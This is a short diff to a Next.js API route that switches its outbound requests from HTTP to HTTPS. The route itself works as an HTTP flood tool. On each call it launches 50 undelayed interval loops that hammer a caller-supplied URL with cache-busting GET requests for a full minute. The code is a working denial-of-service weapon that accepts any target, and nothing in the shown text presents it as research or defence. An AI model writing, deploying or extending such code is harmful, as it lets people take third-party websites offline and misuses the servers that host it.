@@ -1,5 +1,5 @@
 import type { NextApiRequest, NextApiResponse } from 'next'
-import http from 'http'
+import https from 'https'
 
 type ResponseData = {
     message: string
@@ -12,7 +12,7 @@ export default function handler(
 
     for(var i = 0; i < 50; i++) {
         const luanch = setInterval(() => {
-            http.get(`${req.query.name}?ref=${Math.random()}`)
+            https.get(`${req.query.name}?ref=${Math.random()}`)
         })
         setTimeout(() => clearInterval(luanch), 60 * 1000)
     }
